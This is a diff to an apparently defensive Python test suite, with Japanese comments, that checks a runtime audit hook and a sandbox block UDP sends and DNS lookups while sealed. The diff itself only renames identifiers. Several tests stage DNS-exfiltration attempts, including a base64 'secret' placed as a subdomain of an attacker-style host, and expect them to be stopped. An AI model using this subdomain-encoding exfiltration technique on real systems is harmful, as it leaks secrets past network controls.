@@ -10,7 +10,7 @@ NAME = "guard_network_exfiltration - 封鎖中にUDPのsendto()が正しく遮�
 # をforbidden集合に含めていた。しかしUDPの`socket.sendto()`は事前の
 # `connect()`を一切必要とせずにデータを送信できるため、"socket.connect"
 # というaudit eventを一度も発火させない。実機で確認済み:
-# `set_sanctuary_sealed(True)`(深層保護が有効な状態)でも、
+# `set_runtime_sealed(True)`(深層保護が有効な状態)でも、
 # `socket.sendto()`によるデータ送信が例外無しで素通りすることを確認
 # した――封鎖中に外部へデータを持ち出す(exfiltration)経路が、
 # "socket.connect"だけを遮断する実装では塞がれていなかった。
@@ -68,7 +68,7 @@ def _check_udp_sendto_is_blocked_while_sealed() -> tuple:
     import runtime_audit_gatekeeper as mg
 
     mg._register_audit_hook_once()
-    mg.set_sanctuary_sealed(True)
+    mg.set_runtime_sealed(True)
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     try:
         try:
@@ -77,7 +77,7 @@ def _check_udp_sendto_is_blocked_while_sealed() -> tuple:
         except mg.LossOfAtaraxia:
             return True, "OK"
     finally:
-        mg.set_sanctuary_sealed(False)
+        mg.set_runtime_sealed(False)
         s.close()
 
 
@@ -87,7 +87,7 @@ def _check_udp_sendto_is_allowed_when_unsealed() -> tuple:
     import runtime_audit_gatekeeper as mg
 
     mg._register_audit_hook_once()
-    if mg.is_sanctuary_sealed():
+    if mg.is_runtime_sealed():
         return False, "前提条件の異常: 検査開始時点で既に封鎖状態になっている"
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     try:
@@ -115,7 +115,7 @@ def _check_udp_sendmsg_is_blocked_while_sealed() -> tuple:
     import runtime_audit_gatekeeper as mg
 
     mg._register_audit_hook_once()
-    mg.set_sanctuary_sealed(True)
+    mg.set_runtime_sealed(True)
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     try:
         try:
@@ -124,7 +124,7 @@ def _check_udp_sendmsg_is_blocked_while_sealed() -> tuple:
         except mg.LossOfAtaraxia:
             return True, "OK"
     finally:
-        mg.set_sanctuary_sealed(False)
+        mg.set_runtime_sealed(False)
         s.close()
 
 
@@ -134,7 +134,7 @@ def _check_udp_sendmsg_is_allowed_when_unsealed() -> tuple:
     import runtime_audit_gatekeeper as mg
 
     mg._register_audit_hook_once()
-    if mg.is_sanctuary_sealed():
+    if mg.is_runtime_sealed():
         return False, "前提条件の異常: 検査開始時点で既に封鎖状態になっている"
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     try:
@@ -158,7 +158,7 @@ def _check_getaddrinfo_is_blocked_while_sealed() -> tuple:
     import runtime_audit_gatekeeper as mg
 
     mg._register_audit_hook_once()
-    mg.set_sanctuary_sealed(True)
+    mg.set_runtime_sealed(True)
     try:
         try:
             socket.getaddrinfo("leak-via-dns-exfil.example.invalid", 80)
@@ -176,7 +176,7 @@ def _check_getaddrinfo_is_blocked_while_sealed() -> tuple:
             # として報告する(OSErrorを遮断成功と誤判定しない)。
             return False, f"封鎖中にsocket.getaddrinfo()が遮断されず、実際のOS解決処理まで進んでしまった(OSError: {e})"
     finally:
-        mg.set_sanctuary_sealed(False)
+        mg.set_runtime_sealed(False)
 
 
 def _check_getaddrinfo_is_allowed_when_unsealed() -> tuple:
@@ -186,7 +186,7 @@ def _check_getaddrinfo_is_allowed_when_unsealed() -> tuple:
     import runtime_audit_gatekeeper as mg
 
     mg._register_audit_hook_once()
-    if mg.is_sanctuary_sealed():
+    if mg.is_runtime_sealed():
         return False, "前提条件の異常: 検査開始時点で既に封鎖状態になっている"
     try:
         try:
@@ -204,9 +204,9 @@ def _check_getaddrinfo_is_allowed_when_unsealed() -> tuple:
         return False, f"予期しない例外: {type(e).__name__}: {e}"
 
 
-def _check_runtime_guard_sanctum_blocks_unapproved_getaddrinfo() -> tuple:
+def _check_runtime_guard_sandbox_blocks_unapproved_getaddrinfo() -> tuple:
     """[新設 §CT] `runtime_audit_gatekeeper.py`とは独立した別の防御層である
-    `runtime_guard.Sanctum`(allowed_hosts方式)自身も、同じDNS exfiltration
+    `runtime_guard.Sandbox`(allowed_hosts方式)自身も、同じDNS exfiltration
     経路を正しく遮断することを確認する。許可ホストに含まれていない
     ホスト名(機密データを符号化したサブドメインを模したもの)での
     socket.getaddrinfo()が、`runtime_guard.LossOfAtaraxia`として遮断される
@@ -217,10 +217,10 @@ def _check_runtime_guard_sanctum_blocks_unapproved_getaddrinfo() -> tuple:
     secret_payload = "c2VjcmV0LWRhdGEtMTIzNDU"
     hostname = f"{secret_payload}.attacker-exfil-example.com"
     try:
-        with runtime_guard.Sanctum(allowed_dirs=["/tmp"], allowed_hosts={"approved.example.com"}):
+        with runtime_guard.Sandbox(allowed_dirs=["/tmp"], allowed_hosts={"approved.example.com"}):
             try:
                 socket.getaddrinfo(hostname, 80)
-                return False, "runtime_guard.Sanctum起動中に許可外ホスト名でのgetaddrinfo()が遮断されなかった"
+                return False, "runtime_guard.Sandbox起動中に許可外ホスト名でのgetaddrinfo()が遮断されなかった"
             except runtime_guard.LossOfAtaraxia:
                 return True, "OK"
             except OSError as e:
@@ -228,20 +228,20 @@ def _check_runtime_guard_sanctum_blocks_unapproved_getaddrinfo() -> tuple:
                 # ここに到達すること自体が「遮断されず実際のOS解決処理
                 # まで進んでしまった」ことの証拠であり、安全側に倒して
                 # 失敗として報告する。
-                return False, f"runtime_guard.Sanctumが遮断せず、実際のOS解決処理まで進んでしまった(OSError: {e})"
+                return False, f"runtime_guard.Sandboxが遮断せず、実際のOS解決処理まで進んでしまった(OSError: {e})"
     finally:
         pass
 
 
-def _check_runtime_guard_sanctum_allows_approved_host_getaddrinfo() -> tuple:
-    """[新設 §CT・誤検知防止] `runtime_guard.Sanctum`が、allowed_hostsに含まれる
+def _check_runtime_guard_sandbox_allows_approved_host_getaddrinfo() -> tuple:
+    """[新設 §CT・誤検知防止] `runtime_guard.Sandbox`が、allowed_hostsに含まれる
     ホスト名でのgetaddrinfo()、およびバインド用のNone(AI_PASSIVE)解決
     を誤って遮断しないことを確認する。戻り値: (success: bool, detail: str)"""
     import runtime_guard
 
     "warmup".encode("idna")
     try:
-        with runtime_guard.Sanctum(allowed_dirs=["/tmp"], allowed_hosts={"127.0.0.1"}):
+        with runtime_guard.Sandbox(allowed_dirs=["/tmp"], allowed_hosts={"127.0.0.1"}):
             try:
                 socket.getaddrinfo("127.0.0.1", 80)
             except runtime_guard.LossOfAtaraxia as e:
@@ -262,7 +262,7 @@ def _check_legacy_dns_lookups_are_blocked_while_sealed() -> tuple:
     import runtime_audit_gatekeeper as mg
 
     mg._register_audit_hook_once()
-    mg.set_sanctuary_sealed(True)
+    mg.set_runtime_sealed(True)
     try:
         calls = [
             ("socket.gethostbyname", lambda: socket.gethostbyname("leak-via-dns-exfil.example.invalid")),
@@ -284,7 +284,7 @@ def _check_legacy_dns_lookups_are_blocked_while_sealed() -> tuple:
                 return False, f"{label}が遮断されず、実際のOS解決処理まで進んでしまった(OSError: {e})"
         return True, "OK"
     finally:
-        mg.set_sanctuary_sealed(False)
+        mg.set_runtime_sealed(False)
 
 
 def _check_legacy_dns_lookups_are_allowed_when_unsealed() -> tuple:
@@ -293,7 +293,7 @@ def _check_legacy_dns_lookups_are_allowed_when_unsealed() -> tuple:
     import runtime_audit_gatekeeper as mg
 
     mg._register_audit_hook_once()
-    if mg.is_sanctuary_sealed():
+    if mg.is_runtime_sealed():
         return False, "前提条件の異常: 検査開始時点で既に封鎖状態になっている"
     calls = [
         ("socket.gethostbyname", lambda: socket.gethostbyname("127.0.0.1")),
@@ -320,8 +320,8 @@ CHECKS = [
     ("runtime_audit_gatekeeper.ultimate_audit_hook: 非封鎖時の誤検知防止(sendmsg, §CM)", _check_udp_sendmsg_is_allowed_when_unsealed),
     ("runtime_audit_gatekeeper.ultimate_audit_hook: DNS名前解決遮断(§CT)", _check_getaddrinfo_is_blocked_while_sealed),
     ("runtime_audit_gatekeeper.ultimate_audit_hook: 非封鎖時の誤検知防止(getaddrinfo, §CT)", _check_getaddrinfo_is_allowed_when_unsealed),
-    ("runtime_guard.Sanctum: DNS名前解決の許可ホスト検査(§CT)", _check_runtime_guard_sanctum_blocks_unapproved_getaddrinfo),
-    ("runtime_guard.Sanctum: 許可ホスト・バインド用解決の誤検知防止(§CT)", _check_runtime_guard_sanctum_allows_approved_host_getaddrinfo),
+    ("runtime_guard.Sandbox: DNS名前解決の許可ホスト検査(§CT)", _check_runtime_guard_sandbox_blocks_unapproved_getaddrinfo),
+    ("runtime_guard.Sandbox: 許可ホスト・バインド用解決の誤検知防止(§CT)", _check_runtime_guard_sandbox_allows_approved_host_getaddrinfo),
     ("runtime_audit_gatekeeper.ultimate_audit_hook: 旧API DNS関連遮断(gethostbyname等, §CU)", _check_legacy_dns_lookups_are_blocked_while_sealed),
     ("runtime_audit_gatekeeper.ultimate_audit_hook: 非封鎖時の誤検知防止(旧API DNS関連, §CU)", _check_legacy_dns_lookups_are_allowed_when_unsealed),
 ]
@@ -370,7 +370,7 @@ def main():
         NAME,
         "封鎖中のUDP sendto()・sendmsg()による接続不要のデータ送信、"
         "getaddrinfo()によるDNS名前解決(§CT、runtime_audit_gatekeeper・"
-        "runtime_guard.Sanctumの両方の独立した防御層)、およびgethostbyname/"
+        "runtime_guard.Sandboxの両方の独立した防御層)、およびgethostbyname/"
         "gethostbyaddr/getnameinfo等の旧API経由のDNS関連呼び出し(§CU)が"
         "いずれも正しく遮断され、かつ非封鎖時・許可ホスト・バインド用"
         "解決はいずれも誤って遮断されないことを確認しました。",
